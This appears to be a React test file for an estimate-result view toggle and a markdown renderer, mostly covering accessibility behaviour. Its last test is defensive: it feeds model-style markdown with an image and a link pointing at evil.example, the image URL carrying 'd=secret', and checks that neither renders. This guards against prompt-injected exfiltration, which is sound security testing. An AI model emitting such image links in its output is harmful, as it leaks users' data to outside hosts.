import { act, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { useState } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { press } from "@/test/keyboard";
import { EstimateDocument, type ResultView, ResultViewToggle } from "./result-view-toggle";

describe("ResultViewToggle", () => {
  it("offers Structured and Document as one choice that always has a value", async () => {
    const onChange = vi.fn();
    const user = userEvent.setup();
    render(<ResultViewToggle value="structured" onChange={onChange} />);
    const group = screen.getByRole("radiogroup", { name: "Result view" });
    expect(within(group).getAllByRole("radio").map((radio) => radio.textContent)).toEqual(["Structured", "Document"]);
    await user.click(screen.getByRole("radio", { name: "Structured" }));
    expect(onChange).not.toHaveBeenCalled();
    await user.click(screen.getByRole("radio", { name: "Document" }));
    expect(onChange).toHaveBeenCalledWith("document");
  });
});

describe("ResultViewToggle with the keyboard", () => {
  // The ARIA radio group pattern: an arrow key moves focus and checks, so arrows switch the view.
  it("checks the option an arrow key moves to", async () => {
    const onChange = vi.fn();
    const user = userEvent.setup();
    const Toggle = () => {
      const [value, setValue] = useState<ResultView>("structured");
      const change = (view: ResultView) => {
        onChange(view);
        setValue(view);
      };
      return <ResultViewToggle value={value} onChange={change} />;
    };
    render(<Toggle />);
    act(() => screen.getByRole("radio", { name: "Structured" }).focus());
    await press(user, "ArrowRight");
    expect(screen.getByRole("radio", { name: "Document" })).toHaveFocus();
    expect(screen.getByRole("radio", { name: "Document" })).toBeChecked();
    expect(onChange).toHaveBeenCalledWith("document");
  });
});

describe("EstimateDocument", () => {
  afterEach(() => vi.unstubAllGlobals());

  it("names each table's region by the heading above it", () => {
    render(<EstimateDocument markdown={"### Phases\n\n| Phase | Tasks |\n|---|---:|\n| backend | 3 |\n\n### Line items\n\n| ID | Task |\n|---|---|\n| T1 | API |\n"} />);
    const headings = screen.getAllByRole("heading", { level: 4 }); // "###", one level down inside a turn
    const regions = screen.getAllByRole("region");
    expect(regions.map((region) => region.getAttribute("aria-labelledby"))).toEqual(headings.map((heading) => heading.id));
    expect(screen.getByRole("region", { name: "Phases" })).toContainElement(screen.getByRole("cell", { name: "backend" }));
    expect(screen.getByRole("region", { name: "Line items" })).toContainElement(screen.getByRole("cell", { name: "API" }));
  });

  it("renders the server's markdown with the table in a region named after it, a tab stop only while it scrolls sideways", () => {
    const observers: (() => void)[] = [];
    vi.stubGlobal(
      "ResizeObserver",
      class {
        constructor(notify: () => void) {
          observers.push(notify);
        }
        observe() {}
        disconnect() {}
      },
    );
    render(<EstimateDocument markdown={"## Estimation: Portal\n\n### Task breakdown\n\n| ID | Task | Expected |\n|---|---|---:|\n| T1 | API | 12.0 |\n"} />);
    expect(screen.getByRole("heading", { level: 3, name: "Estimation: Portal" })).toBeInTheDocument(); // "##", below the turn's h2
    const region = screen.getByRole("region", { name: "Task breakdown" });
    expect(within(region).getByRole("cell", { name: "12.0" })).toHaveStyle({ textAlign: "right" });
    // jsdom has no layout: the region is 400 px wide and its table `scrollWidth`
    const resize = (scrollWidth: number) => {
      Object.defineProperties(region, { scrollWidth: { value: scrollWidth, configurable: true }, clientWidth: { value: 400, configurable: true } });
      act(() => observers.forEach((notify) => notify()));
    };
    resize(400);
    expect(region).not.toHaveAttribute("tabindex"); // it fits: nothing to scroll, no extra tab stop
    resize(640);
    expect(region).toHaveAttribute("tabindex", "0"); // keyboard users can scroll it
    resize(400);
    expect(region).not.toHaveAttribute("tabindex");
  });

  // The markdown carries model output, which a transcript can steer: an image would load a URL the moment it renders.
  it("never loads images or follows links from the model's text, and shows raw HTML as text", () => {
    const { container } = render(
      <EstimateDocument markdown={"Summary ![x](https://evil.example/p.png?d=secret) see [docs](https://evil.example) <b>bold</b>"} />,
    );
    expect(container.querySelector("img, a, link, b")).toBeNull();
    expect(container).toHaveTextContent("Summary see docs <b>bold</b>");
  });
});
